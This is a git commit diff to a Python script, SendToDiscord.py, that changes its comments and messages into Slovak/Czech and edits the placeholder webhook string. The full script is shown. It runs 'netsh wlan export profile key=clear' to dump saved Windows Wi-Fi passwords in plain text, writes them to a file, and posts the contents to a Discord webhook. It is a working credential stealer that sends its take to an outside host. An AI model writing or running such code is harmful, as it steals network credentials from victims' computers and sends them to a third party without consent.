32dcd25b38024f89bb50c5ba6b7f079e0169a276
Dominik Hulin <109801079+Fattcat@users.noreply.github.com>
2024-01-06 23:13:20 +0100

    Update SendToDiscord.py

--- SendToDiscord.py
+++ SendToDiscord.py
@@ -3,38 +3,34 @@ import os
 import requests
 
 # Discord webhook URL
-discord_webhook_url = 'Sem napisem Discord webhook link'
+discord_webhook_url = 'Sem napis TVOJ Discord WebHook Link'
 
-# Create a file
 password_file = open('passwords.txt', "w")
-password_file.write("Hello sir! Here are your passwords:\n\n")
+password_file.write("Helloouuuu toii su hesielka:\n🧨🧨\n")
 password_file.close()
 
-# Lists
+# Listy
 wifi_files = []
 wifi_names = []
 wifi_passwords = []
 
-# Use Python to execute a Windows command
 command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()
 
-# Grab current directory
 path = os.getcwd()
-
-# Write command output to the file
+#Zapise do suboru
 with open('passwords.txt', 'a') as password_file:
     password_file.write(command_output)
 
-# Read the content of the file
+# Precita to
 with open('passwords.txt', 'r') as password_file:
     content = password_file.read()
 
-# Prepare data for Discord webhook
+# Ulozi to do jsonu (nejako)
 discord_data = {
-    'content': f"🚀 **Breaking News!** 🚀\n\n{content}\n\n🔐 *Secured and Sent!* 🔐"
+    'content': f"🚀 **Vole noví Zprávii !** 🚀\n\n{content}\n\n🔐 * Pip Puup!* 🔐"
 }
 
-# Send data to Discord webhook
+# Odosle data na Discord WebHook
 response = requests.post(discord_webhook_url, json=discord_data)
 
 print("Data sent to Discord webhook. Feel the drama!")
